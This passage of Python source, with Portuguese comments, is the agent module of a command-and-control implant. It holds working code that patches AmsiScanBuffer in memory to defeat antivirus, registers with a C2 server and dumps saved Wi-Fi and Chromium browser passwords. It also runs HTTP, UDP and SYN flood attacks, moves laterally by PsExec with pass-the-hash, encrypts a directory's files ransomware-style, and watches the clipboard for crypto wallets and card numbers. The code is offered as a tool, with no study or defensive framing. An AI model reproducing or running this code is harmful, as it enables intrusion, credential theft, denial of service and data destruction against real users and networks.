    """Reverte a impersonation e volta ao token original do processo."""
    try:
        import ctypes as _ct
        _ct.windll.advapi32.RevertToSelf()
        return "Token revertido ao original (RevertToSelf executado).", "info"
    except Exception as e:
        return "Erro ao reverter token: " + str(e), "error"


# ==============================================================================
# AMSI PATCH — bypass in-memory (T1562.001)
# ==============================================================================

def patch_amsi(args=None):
    """
    Patcha AmsiScanBuffer em memoria para sempre retornar AMSI_RESULT_CLEAN (1).
    Nenhum arquivo e modificado. O patch vale para o processo atual do agente.
    Tecnica: T1562.001 - Impair Defenses: Disable or Modify Tools.

    Funcionamento:
      1. Carrega amsi.dll no processo (ja esta carregada em processos com .NET/PS).
      2. Localiza o endereco de AmsiScanBuffer via GetProcAddress.
      3. Muda permissao da pagina para RWX via VirtualProtect.
      4. Escreve patch de 6 bytes: mov eax, 0x80070057 ; ret
         (AMSI_RESULT_CLEAN = 0x01 tambem funciona, mas 0x80070057 = E_INVALIDARG
          e mais consistente entre versoes do Windows).
      5. Restaura permissao original.
    """
    if platform.system() != "Windows":
        return "AMSI Patch disponivel apenas no Windows.", "error"

    import ctypes as _ct
    import ctypes.wintypes as _wt

    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_READ      = 0x20

    kernel32 = _ct.windll.kernel32

    # --- CRITICO: definir restype correto para ponteiros em 64-bit ---
    # Sem isso, ctypes assume c_int (32-bit assinado). Enderecos com bits
    # altos setados ficam negativos → `not addr` avalia True mesmo sendo valido.
    kernel32.LoadLibraryW.restype    = _ct.c_void_p
    kernel32.GetProcAddress.restype  = _ct.c_void_p
    kernel32.GetProcAddress.argtypes = [_ct.c_void_p, _ct.c_char_p]

    try:
        # Carrega amsi.dll (se nao estiver carregada, LoadLibrary a carrega)
        h_amsi = kernel32.LoadLibraryW("amsi.dll")
        if not h_amsi:
            return "Falha ao carregar amsi.dll (AMSI pode nao estar presente neste host).", "error"

        # Obtem endereco de AmsiScanBuffer
        amsi_scan_addr = kernel32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
        if not amsi_scan_addr:
            return "AmsiScanBuffer nao encontrado em amsi.dll.", "error"

        # Patch: B8 57 00 07 80 C3
        # mov eax, 0x80070057  (E_INVALIDARG - AMSI descarta como invalido)
        # ret
        # NOTA: nao usar byte literal com \x00 aqui -- StringObfuscationStrategy
        # trata strings C-style e trunca no null byte, corrompendo o executavel.
        patch_bytes = bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3])

        # Altera protecao de memoria para RWX
        old_protect = _wt.DWORD(0)
        addr_ptr = _ct.c_void_p(amsi_scan_addr)
        if not kernel32.VirtualProtect(addr_ptr, len(patch_bytes), PAGE_EXECUTE_READWRITE, _ct.byref(old_protect)):
            return "VirtualProtect (RWX) falhou. Codigo de erro: " + str(kernel32.GetLastError()), "error"

        # Escreve o patch via ctypes.memmove — escreve diretamente no espaco de
        # enderecamento do processo sem passar por WriteProcessMemory (que exige
        # PROCESS_VM_WRITE e pode ser bloqueado por CFG/politicas de integridade).
        # VirtualProtect(RWX) ja garantiu que a pagina e gravavel.
        patch_buf = (_ct.c_char * len(patch_bytes))(*patch_bytes)
        _ct.memmove(amsi_scan_addr, patch_buf, len(patch_bytes))

        # Verifica lendo de volta os bytes escritos
        readback = (_ct.c_ubyte * len(patch_bytes)).from_address(amsi_scan_addr)
        bytes_ok = sum(1 for i, b in enumerate(patch_bytes) if readback[i] == b)

        # Restaura protecao original
        restore_protect = _wt.DWORD(0)
        kernel32.VirtualProtect(addr_ptr, len(patch_bytes), old_protect.value, _ct.byref(restore_protect))

        if bytes_ok == len(patch_bytes):
            msg = (
                "AMSI Patch aplicado com sucesso!\n"
                "Funcao patchada: AmsiScanBuffer em amsi.dll\n"
                "Bytes escritos: " + str(bytes_ok) + "\n"
                "Patch: MOV EAX, E_INVALIDARG ; RET\n"
                "Efeito: AmsiScanBuffer sempre retorna E_INVALIDARG — AV/EDR nao recebe resultados de scan.\n"
                "Tecnica: T1562.001 - Impair Defenses"
            )
            write_internal_log("AMSI patch aplicado: " + str(bytes_ok) + " bytes em AmsiScanBuffer")
            return msg, "info"
        else:
            return ("Patch incompleto (" + str(bytes_ok) + "/" + str(len(patch_bytes)) +
                    " bytes verificados). VirtualProtect bem-sucedido mas escrita falhou — "
                    "possivel protecao de integridade de codigo (HVCI/Secure Boot)."), "error"

    except Exception as e:
        import traceback as _tb
        return "Excecao durante AMSI patch: " + str(e) + "\n" + _tb.format_exc(), "error"


# --- Register com criptografia --- #

def register_with_c2():
    global AGENT_ID
    write_internal_log("Tentando registrar com o C2...")
    try:
        sys_info, _ = capture_system_info()
        sys_info['privileges'] = check_privileges()
        sys_info['agent_version'] = AGENT_VERSION

        payload_json = json.dumps(sys_info)
        encrypted_payload = encrypt_data(payload_json, C2_AES_KEY)
        if not encrypted_payload:
            return False

        payload_bytes = encrypted_payload.encode('utf-8')
        auth_headers = get_authenticated_headers(payload_bytes)
        # Tenta SERVER_URL e todos os fallbacks para registro
        response = _http_post_with_fallback("/register", payload_bytes, auth_headers, timeout=10)

        if response.status_code == 200:
            response_data = _decode_encrypted_json_response(response, "register")
            candidate_id = response_data.get("agent_id") if response_data else None

            if isinstance(candidate_id, str) and 0 < len(candidate_id) <= 128:
                AGENT_ID = candidate_id
                write_internal_log("Registro bem-sucedido com identidade válida.")
                return True
            else:
                write_internal_log("Resposta de registro sem identidade válida.")
                return False
        else:
            write_internal_log(f"Falha no registro. Status Code: {response.status_code}")
            return False
    except Exception as e:
        write_internal_log(f"Erro de conexão durante o registro: {e}")
        return False




def capture_wifi_passwords(args=None):
    """
    Extrai senhas de perfis Wi-Fi salvos no Windows.
    Usa o utilitário nativo 'netsh' e faz o parse da saída.
    """
    if platform.system() != "Windows":
        return "Este comando é aplicável apenas no Windows.", "error"

    # --- INÍCIO DA CORREÇÃO: Caminho Absoluto ---
    # Garante que o comando funcione mesmo se C:\Windows\System32 não estiver no PATH.
    system_root = os.environ.get("SystemRoot", "C:\\Windows")
    netsh_path = os.path.join(system_root, "System32", "netsh.exe")

    if not os.path.exists(netsh_path):
        return f"Erro crítico: '{netsh_path}' não encontrado.", "error"
    # --- FIM DA CORREÇÃO ---

    try:
        # 1. Lista todos os perfis Wi-Fi salvos
        command = f'"{netsh_path}" wlan show profiles'
        profiles_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, encoding='cp850', errors='ignore')
        
        # Extrai os nomes dos perfis (SSIDs) da saída
        profile_names = [line.split(":")[1].strip() for line in profiles_output.split('\n') if "All User Profile" in line or "Perfil de Todos os Usuários" in line]
        
        wifi_credentials = []
        for profile_name in profile_names:
            try:
                # 2. Para cada perfil, obtém os detalhes, incluindo a senha em texto claro
                # A opção 'key=clear' força a exibição da senha. Requer privilégios de Administrador.
                password_command = f'"{netsh_path}" wlan show profile name="{profile_name}" key=clear'
                profile_info = subprocess.check_output(password_command, shell=True, stderr=subprocess.STDOUT, encoding='cp850', errors='ignore')
                
                password = "N/A (Requer Admin ou rede aberta)"
                # Procura pela senha na saída (em português e inglês)
                for line in profile_info.split('\n'):
                    if "Key Content" in line or "Conteúdo da Chave" in line:
                        password = line.split(":")[1].strip()
                        break
                
                wifi_credentials.append({"ssid": profile_name, "password": password})
            except subprocess.CalledProcessError:
                # Isso geralmente acontece se o perfil não tiver uma senha salva
                wifi_credentials.append({"ssid": profile_name, "password": "N/A (Sem senha ou erro)"})
        
        if not wifi_credentials:
            return "Nenhum perfil Wi-Fi encontrado no sistema.", "info"

        return wifi_credentials, "wifi_credentials_result"

    except subprocess.CalledProcessError as e:
        # Se o primeiro comando (show profiles) falhar, pode ser que o Wi-Fi esteja desativado.
        error_output = e.output
        if "não está executando" in error_output or "is not running" in error_output:
            return "Erro: O serviço WLAN AutoConfig não está em execução no alvo.", "error"
        return f"Erro ao executar netsh: {error_output}", "error"
    except Exception as e:
        return f"Erro inesperado ao capturar senhas de Wi-Fi: {e}", "error"


# Mapa de portas conhecidas para nomes de servico
PORT_SERVICE_MAP = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
    5985: "WinRM-HTTP", 5986: "WinRM-HTTPS", 6379: "Redis", 7443: "HTTPS-Alt",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9090: "HTTP-Alt", 9999: "Unknown",
    27017: "MongoDB", 1433: "MSSQL", 1521: "Oracle", 11211: "Memcached",
}

# Probes de banner por porta: bytes a enviar apos conectar (None = so leitura)
_BANNER_PROBES = {
    21:   None,          # FTP envia banner automaticamente
    22:   None,          # SSH envia banner automaticamente
    25:   None,          # SMTP envia banner automaticamente
    80:   b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n",
    8080: b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n",
    8443: b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n",
    443:  None,          # TLS - nao tenta banner (retorna lixo binario)
    7443: None,
    110:  None,          # POP3 envia banner automaticamente
    143:  None,          # IMAP envia banner automaticamente
}

def _grab_banner(ip, port, timeout=1.0):
    """Tenta capturar o banner de um servico em ip:port. Retorna string ou vazio."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((str(ip), port))
        probe = _BANNER_PROBES.get(port, None)
        if probe:
            sock.sendall(probe)
        raw = sock.recv(256)
        sock.close()
        banner = raw.decode("utf-8", errors="replace").strip()
        # Remove caracteres de controle exceto newline
        banner = "".join(c if c >= " " or c == "\n" else "" for c in banner)
        # Primeira linha nao vazia, limitada a 120 chars
        for line in banner.splitlines():
            line = line.strip()
            if line:
                return line[:120]
        return ""
    except Exception:
        return ""


def scan_port(ip, port, open_ports_dict, lock):
    """Verifica se uma porta esta aberta. Registra porta no dicionario compartilhado."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((str(ip), port))
        sock.close()
        if result == 0:
            with lock:
                if str(ip) not in open_ports_dict:
                    open_ports_dict[str(ip)] = []
                open_ports_dict[str(ip)].append(port)
    except Exception:
        pass


# ==============================================================================
# INÍCIO DO MÓDULO DE ATAQUE COORDENADO
# ==============================================================================

# --- Funções de Worker (o que cada thread faz) ---

def worker_http_flood(target_url, stop_event ):
    """Envia requisições GET para uma URL."""
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
    while not stop_event.is_set():
        try:
            requests.get(target_url, headers=headers, timeout=2)
        except Exception:
            pass

def worker_udp_flood(target_ip, target_port, stop_event):
    """Envia pacotes UDP com dados aleatórios."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 bytes de dados aleatórios
    payload = get_random_bytes(1024)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
        except Exception:
            pass

def worker_tcp_flood(target_ip, target_port, stop_event):
    """Envia pacotes TCP SYN (inicia conexões e as abandona)."""
    while not stop_event.is_set():
        try:
            # Cria um novo socket a cada iteração para um novo SYN
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            # A conexão em si é o ataque. Não precisamos enviar dados.
            sock.connect((target_ip, target_port))
            # Fechamos imediatamente para não esgotar os recursos locais rapidamente.
            # O alvo, no entanto, terá que lidar com o handshake.
            sock.close()
        except Exception:
            pass

# --- Dicionário de Métodos de Ataque ---

ATTACK_METHODS = {
    "http_get": worker_http_flood,
    "udp": worker_udp_flood,
    "tcp_syn": worker_tcp_flood
}

# --- Função Principal da Tarefa ---

def start_attack(args ):
    """
    Função despachante que inicia um ataque de flood com base nos argumentos fornecidos.
    'args': {"method": "...", "target": "...", "port": ..., "duration": ..., "threads": ...}
    """
    try:
        # 1. Validar e extrair argumentos
        method = args.get("method")
        target = args.get("target") # Pode ser uma URL ou um IP
        port = int(args.get("port", 80))
        duration = int(args.get("duration", 60))
        num_threads = int(args.get("threads", 50))

        if not all([method, target]):
            return "Erro: 'method' e 'target' são argumentos obrigatórios.", "error"

        if method not in ATTACK_METHODS:
            return f"Erro: Método de ataque '{method}' desconhecido. Métodos suportados: {list(ATTACK_METHODS.keys())}", "error"

        # 2. Selecionar a função worker correta
        worker_function = ATTACK_METHODS[method]
        
        # Para HTTP, o alvo é a URL completa. Para outros, é o IP.
        worker_args = (target, port) if method != "http_get" else (target, )

        write_internal_log(f"Iniciando ataque '{method}' para {target}:{port} com {num_threads} threads por {duration}s.")

        # 3. Lógica de execução com threads (comum a todos os ataques)
        stop_event = threading.Event()
        threads = []

        for _ in range(num_threads):
            # Adiciona o stop_event como último argumento para o worker
            thread_args = worker_args + (stop_event,)
            thread = threading.Thread(target=worker_function, args=thread_args)
            thread.daemon = True
            threads.append(thread)
            thread.start()

        # Mantém o ataque rodando pela duração especificada
        time.sleep(duration)

        # Sinaliza para todas as threads pararem
        stop_event.set()

        # Espera um pouco para as threads encerrarem
        for thread in threads:
            thread.join(timeout=1.0)

        success_message = f"Ataque '{method}' para {target} concluído após {duration} segundos."
        write_internal_log(success_message)
        return success_message, "info"

    except Exception as e:
        import traceback
        error_message = f"Falha ao iniciar o ataque: {e}\n{traceback.format_exc()}"
        write_internal_log(error_message)
        return error_message, "error"



def lateral_psexec(args):
    """
    Executa um comando em um alvo remoto usando uma implementação em Python do PsExec (via impacket).
    Args esperados: {'target_ip': '...', 'username': '...', 'password': '...', 'domain': '...', 'command': '...'}
    O hash NTLM pode ser usado no lugar da senha.
    """
    if platform.system() != "Windows":
        return "Movimento lateral com PsExec só é suportado a partir de um agente Windows.", "error"

    try:
        target_ip = args.get('target_ip')
        username = args.get('username')
        password = args.get('password', '')
        domain = args.get('domain', '')
        command = args.get('command')
        lmhash = ''
        nthash = ''

        if not all([target_ip, username, command]):
            return "Erro: 'target_ip', 'username', e 'command' são obrigatórios.", "error"

        # Suporte para Pass-the-Hash
        if ':' in password and len(password) == 65:
            try:
                lmhash, nthash = password.split(':')
                password = ''
                write_internal_log(f"Usando Pass-the-Hash para {username}.")
            except ValueError:
                # Não é um hash válido, trata como senha normal
                pass

        write_internal_log(f"Movimento Lateral (PsExec): Tentando conectar a {target_ip} como {domain}\\{username}")
        
        smb = SMBConnection(target_ip, target_ip, sess_port=445, timeout=60)
        smb.login(username, password, domain, lmhash, nthash)

        rpc_transport = transport.SMBTransport(target_ip, target_ip, filename=r'\pipe\svcctl', smb_connection=smb)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(dcerpc_scmr.MSRPC_UUID_SCMR)
        
        service_name = ''.join(random.choices(string.ascii_letters, k=8))
        # Redireciona a saída e o erro para um arquivo temporário na unidade C$ do alvo
        command_to_run = f'%COMSPEC% /C {command} > \\\\127.0.0.1\\C$\\__output 2>&1'
        
        scm_handle = dcerpc_scmr.hROpenSCManagerW(dce)
        resp = dcerpc_scmr.hRCreateServiceW(dce, scm_handle, service_name, service_name, lpBinaryPathName=command_to_run)
        service_handle = resp['lpServiceHandle']
        
        try:
            dcerpc_scmr.hRStartServiceW(dce, service_handle)
            write_internal_log(f"Movimento Lateral (PsExec): Comando '{command}' executado com sucesso em {target_ip}.")
        finally:
            # Bloco de limpeza: garante que o serviço seja parado e deletado
            try:
                dcerpc_scmr.hRDeleteService(dce, service_handle)
            except:
                pass
            dcerpc_scmr.hRCloseServiceHandle(dce, service_handle)

        # Tenta ler o resultado do arquivo de saída
        output = ""
        time.sleep(3) # Espera o comando terminar e escrever no arquivo
        try:
            # Reautentica se necessário para ler o arquivo
            smb.login(username, password, domain, lmhash, nthash)
            # O caminho para o arquivo de saída na share C$
            file_path = ntpath.join('C$', '__output')
            
            # Usa um objeto de arquivo temporário para ler os dados
            temp_file = tempfile.NamedTemporaryFile()
            smb.getFile(file_path.split('$')[0] + '$', file_path.split('\\')[1], temp_file.write)
            temp_file.seek(0)
            output = temp_file.read().decode('cp437', errors='ignore')
            temp_file.close()
            
            smb.deleteFile('C$', '__output')
        except Exception as e:
            output = f"Comando executado, mas não foi possível capturar a saída: {e}"

        smb.logoff()
        return f"Execução remota em {target_ip} concluída.\n\nSaída:\n{output}", "psexec_result"

    except Exception as e:
        error_msg = f"Erro durante a execução do PsExec: {e}"
        write_internal_log(error_msg)
        import traceback
        write_internal_log(traceback.format_exc())
        return error_msg, "error"

def scan_internal_network(args=None):
    """
    Realiza um scan de rede em tres fases:
    1. Ping scan para encontrar hosts vivos.
    2. Port scan em portas comuns nos hosts vivos.
    3. Banner grabbing nas portas abertas para identificar servicos.

    scan_results agora retorna por host uma lista de objetos:
        { "port": 22, "service": "SSH", "banner": "SSH-2.0-OpenSSH_8.9" }
    """
    try:
        host_name = socket.gethostname()
        host_ip = socket.gethostbyname(host_name)
        net = ipaddress.ip_network(f"{host_ip}/24", strict=False)

        # --- Fase 1: Ping Scan ---
        write_internal_log("Fase 1: Ping Scan...")
        live_hosts = []
        threads = []
        lock = threading.Lock()
        for ip in net.hosts():
            t = threading.Thread(target=ping_host, args=(ip, live_hosts, lock), daemon=True)
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=2.0)
        write_internal_log(f"Fase 1 concluida. {len(live_hosts)} hosts vivos.")

        # --- Fase 2: Port Scan ---
        write_internal_log("Fase 2: Port Scan...")
        ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
                         443, 445, 1433, 1521, 3306, 3389, 5432,
                         5985, 5986, 6379, 7443, 8080, 8443, 9090,
                         9999, 11211, 27017]
        open_ports_by_host = {}  # ip -> [portas]
        port_threads = []
        port_lock = threading.Lock()
        for ip in live_hosts:
            for port in ports_to_scan:
                t = threading.Thread(
                    target=scan_port,
                    args=(ip, port, open_ports_by_host, port_lock),
                    daemon=True
                )
                port_threads.append(t)
                t.start()
        for t in port_threads:
            t.join(timeout=1.0)
        write_internal_log("Fase 2 concluida.")

        # --- Fase 3: Banner Grabbing ---
        write_internal_log("Fase 3: Banner Grabbing nos servicos descobertos...")
        # Inicializa TODOS os hosts vivos, mesmo sem portas abertas
        # Isso garante que hosts ping-alive apareçam no Pivot Chains
        # mesmo que nenhuma porta da lista esteja aberta
        enriched = {str(ip): [] for ip in live_hosts}
        banner_threads = []
        banner_lock = threading.Lock()

        def _do_banner(ip, port):
            service = PORT_SERVICE_MAP.get(port, f"port-{port}")
            # Portas TLS puros: nao tentar banner (retorna binario)
            if port in (443, 5986, 7443, 8443):
                banner = ""
            else:
                banner = _grab_banner(ip, port, timeout=1.0)
            with banner_lock:
                enriched[ip].append({
                    "port":    port,
                    "service": service,
                    "banner":  banner,
                })

        for ip, ports in open_ports_by_host.items():
            for port in ports:
                t = threading.Thread(target=_do_banner, args=(ip, port), daemon=True)
                banner_threads.append(t)
                t.start()
        for t in banner_threads:
            t.join(timeout=2.0)

        # Ordena portas por numero dentro de cada host
        for ip in enriched:
            enriched[ip].sort(key=lambda x: x["port"])

        write_internal_log(f"Fase 3 concluida. {sum(len(v) for v in enriched.values())} servicos identificados.")

        report = {
            "agent_ip":        host_ip,
            "network":         str(net),
            "live_hosts_found": len(live_hosts),
            "scan_results":    enriched,  # ip -> [{port, service, banner}]
        }
        return report, "network_scan_result"

    except Exception as e:
        return f"Erro ao escanear a rede: {e}", "error"

def ping_host(ip, live_hosts, lock):
    system = platform.system()
    try:
        if system == "Windows":
            command = ["ping", "-n", "1", "-w", "500", str(ip)]
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            creationflags = subprocess.CREATE_NO_WINDOW
        else:
            command = ["ping", "-c", "1", "-W", "0.5", str(ip)]
            startupinfo = None
            creationflags = 0
        
        result = subprocess.run(command, capture_output=True, startupinfo=startupinfo, creationflags=creationflags)
        if result.returncode == 0:
            with lock:
                live_hosts.append(str(ip))
    except Exception:
        pass

def encrypt_files_on_target(target_path):
    if not AES: return "Erro: Biblioteca PyCryptodomex não encontrada.", "error"
    if not os.path.isdir(target_path): return f"Erro: O caminho '{target_path}' não é um diretório válido.", "error"
    key = get_random_bytes(32)
    encrypted_files, errors = [], []
    for root, dirs, files in os.walk(target_path):
        for filename in files:
            file_path = os.path.join(root, filename)
            if file_path == sys.executable or file_path.endswith('.encrypted'): continue
            try:
                with open(file_path, 'rb') as f_in: data = f_in.read()
                cipher = AES.new(key, AES.MODE_CBC)
                ciphertext_bytes = cipher.encrypt(pad(data, AES.block_size))
                with open(file_path, 'wb') as f_out: f_out.write(cipher.iv); f_out.write(ciphertext_bytes)
                new_file_path = file_path + ".encrypted"; os.rename(file_path, new_file_path)
                encrypted_files.append(new_file_path)
            except Exception as e: errors.append(f"Falha ao criptografar {file_path}: {e}")
    report = {"status": "Concluído", "target_directory": target_path, "files_encrypted": len(encrypted_files), "errors_encountered": len(errors), "encryption_key_base64": base64.b64encode(key).decode('utf-8'), "details": {"encrypted_files_list": encrypted_files, "error_log": errors}}
    return report, "encryption_report"

def decrypt_files_on_target(args):
    if not AES: return "Erro: Biblioteca PyCryptodomex não encontrada no agente.", "error"
    try: target_path = args['target_path']; key_b64 = args['key_b64']
    except KeyError: return "Erro: Argumentos 'target_path' ou 'key_b64' faltando.", "error"
    if not os.path.isdir(target_path): return f"Erro: O caminho '{target_path}' não é um diretório válido no alvo.", "error"
    try:
        key = base64.b64decode(key_b64)
        if len(key) != 32: return "Erro: A chave de descriptografia fornecida é inválida (tamanho incorreto).", "error"
    except Exception: return "Erro: A chave de descriptografia fornecida não é uma string Base64 válida.", "error"
    decrypted_files, errors = [], []
    for root, dirs, files in os.walk(target_path):
        for filename in files:
            if filename.endswith(".encrypted"):
                file_path = os.path.join(root, filename)
                try:
                    with open(file_path, 'rb') as f_in: iv = f_in.read(16); ciphertext = f_in.read()
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    original_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
                    original_path = file_path[:-len(".encrypted")]
                    with open(original_path, 'wb') as f_out: f_out.write(original_data)
                    os.remove(file_path)
                    decrypted_files.append(original_path)
                except Exception as e: errors.append(f"Falha ao descriptografar {file_path}: {e}")
    report = {"status": "Concluído", "target_directory": target_path, "files_decrypted": len(decrypted_files), "errors_encountered": len(errors), "error_log": errors}
    return report, "decryption_report"


def download_from_target(remote_path):
    try:
        if not os.path.exists(remote_path) or not os.path.isfile(remote_path): return f"Erro: Arquivo não encontrado em '{remote_path}'", "error"
        with open(remote_path, 'rb') as f: file_content = f.read()
        return {"filename": os.path.basename(remote_path), "content_b64": base64.b64encode(file_content).decode('utf-8')}, "file_download"
    except Exception as e: return f"Erro ao ler o arquivo: {e}", "error"

def upload_to_target(args): # <-- MUDANÇA AQUI: aceita um único argumento 'args'
    """
    Recebe um dicionário de argumentos, extrai o caminho de destino e o conteúdo,
    e salva o arquivo no alvo.
    """
    try:
        # Desempacota os valores de dentro do dicionário 'args'
        destination_path = args['destination_path']
        file_content_b64 = args['file_content_b64']
    except KeyError:
        return "Erro: Argumentos 'destination_path' ou 'file_content_b64' faltando no comando de upload.", "error"
    except TypeError:
        return "Erro: Formato de argumentos inválido para upload.", "error"

    try:
        file_content = base64.b64decode(file_content_b64)
        dir_name = os.path.dirname(destination_path)
        if dir_name: 
            os.makedirs(dir_name, exist_ok=True)
        with open(destination_path, 'wb') as f:
            f.write(file_content)
        return f"Arquivo salvo com sucesso em: {destination_path}", "upload_success"
    except Exception as e:
        return f"Erro ao salvar o arquivo: {e}", "error"


def _chromium_profiles():
    """
    Retorna lista de (browser_name, base_path) para todos os navegadores
    baseados em Chromium presentes no sistema.
    Ordem: Chrome, Edge, Brave, Opera, Vivaldi.
    """
    system = platform.system()
    profiles = []
    if system == "Windows":
        local = os.environ.get('LOCALAPPDATA', '')
        appdata = os.environ.get('APPDATA', '')
        candidates = [
            ("Chrome",  os.path.join(local,   "Google",              "Chrome",         "User Data")),
            ("Edge",    os.path.join(local,   "Microsoft",           "Edge",           "User Data")),
            ("Brave",   os.path.join(local,   "BraveSoftware",       "Brave-Browser",  "User Data")),
            ("Opera",   os.path.join(appdata, "Opera Software",      "Opera Stable")),
            ("Vivaldi", os.path.join(local,   "Vivaldi",             "User Data")),
        ]
    elif system == "Linux":
        home = os.path.expanduser("~")
        candidates = [
            ("Chrome",  os.path.join(home, ".config", "google-chrome")),
            ("Edge",    os.path.join(home, ".config", "microsoft-edge")),
            ("Brave",   os.path.join(home, ".config", "BraveSoftware", "Brave-Browser")),
        ]
    elif system == "Darwin":
        home = os.path.expanduser("~")
        candidates = [
            ("Chrome", os.path.join(home, "Library", "Application Support", "Google", "Chrome")),
            ("Edge",   os.path.join(home, "Library", "Application Support", "Microsoft Edge")),
            ("Brave",  os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")),
        ]
    else:
        return []
    for name, path in candidates:
        if os.path.isdir(path):
            profiles.append((name, path))
    return profiles


def get_chrome_path(component: str) -> str:
    """Compat: retorna o path do componente para o primeiro navegador disponivel."""
    profiles = _chromium_profiles()
    if not profiles:
        return None
    _, base_path = profiles[0]
    path_map = {
        "Local State": os.path.join(base_path, "Local State"),
        "Login Data":  os.path.join(base_path, "Default", "Login Data"),
        "History":     os.path.join(base_path, "Default", "History"),
    }
    return path_map.get(component)


def _get_encryption_key_for(base_path):
    """Retorna a chave AES de um perfil Chromium especifico, ou None se falhar."""
    local_state_path = os.path.join(base_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        system = platform.system()
        if system == "Windows" and win32crypt:
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        elif system == "Linux" and AES:
            return encrypted_key
    except Exception:
        return None
    return None


def get_encryption_key():
    """Compat: retorna a chave do primeiro navegador que responder."""
    for _, base_path in _chromium_profiles():
        key = _get_encryption_key_for(base_path)
        if key:
            return key
    return None

def decrypt_password(password: bytes, key: bytes) -> str:
    """Tenta descriptografar senhas do Chrome v80+ (GCM) e pre-v80 (DPAPI) no Windows."""
    system = platform.system()
    try:
        if system == "Windows":
            # --- Início da Correção para Chrome v80+ ---
            try:
                
                if password.startswith(b'v10') or password.startswith(b'v11'):
                    nonce = password[3:15]
                    ciphertext_with_tag = password[15:]
                    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                    
                    # A função decrypt_and_verify lida com o ciphertext e o tag (últimos 16 bytes)
                    decrypted_pass = cipher.decrypt_and_verify(ciphertext_with_tag[:-16], ciphertext_with_tag[-16:])
                    return decrypted_pass.decode('utf-8')
                else:
                    # É um formato antigo (pre-v80), usa DPAPI direto no blob da senha
                    return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
            except Exception:
                # Se o GCM falhar (chave errada?) OU o DPAPI falhar, caia no DPAPI antigo como último recurso
                try:
                    return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
                except Exception as e_dpapi:
                    write_internal_log(f"Falha na descriptografia GCM e DPAPI. Erro final: {e_dpapi}")
                    return "Nao foi possivel descriptografar (Ambos os metodos falharam)"
            # --- Fim da Correção ---
        
        elif system == "Linux" and AES:
           
            iv, payload = password[3:15], password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode()

    except Exception as e_geral:
        write_internal_log(f"Erro geral em decrypt_password: {e_geral}")
        return "Nao foi possivel descriptografar" # O catch-all original
        
    return "SO nao suportado"

def capture_clipboard(args=None):
    """
    Captura o conteudo atual do clipboard do Windows.
    Suporta texto Unicode (CF_UNICODETEXT) e texto ANSI (CF_TEXT).
    Tecnica: T1115 - Clipboard Data.
    """
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        try:
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                content = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
            elif win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                raw = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                content = raw.decode('utf-8', errors='replace')
            else:
                content = "[Clipboard vazio ou formato nao suportado]"
        finally:
            win32clipboard.CloseClipboard()
        if not content:
            return "[Clipboard vazio]", "clipboard_result"
        return content, "clipboard_result"
    except ImportError:
        return "Erro: win32clipboard nao disponivel neste build.", "error"
    except Exception as e:
        return "Erro ao capturar clipboard: " + str(e), "error"


# ==============================================================================
# CLIPBOARD MONITOR CONTINUO (T1115)
# ==============================================================================

# Estado global do monitor de clipboard
_clipboard_monitor_active = False
_clipboard_monitor_thread = None

def _clipboard_detect_pattern(text):
    """Retorna o tipo de dado detectado no texto ou None."""
    import re
    patterns = [
        ("crypto_wallet_btc",  r"\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b"),
        ("crypto_wallet_eth",  r"\b0x[a-fA-F0-9]{40}\b"),
        ("credit_card",        r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b"),
        ("api_key_generic",    r"\b[A-Za-z0-9_\-]{32,64}\b"),
        ("password_pattern",   r"(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[!@#\$%\^&\*])[A-Za-z\d!@#\$%\^&\*]{8,}"),
        ("ip_address",         r"\b(?:\d{1,3}\.){3}\d{1,3}\b"),
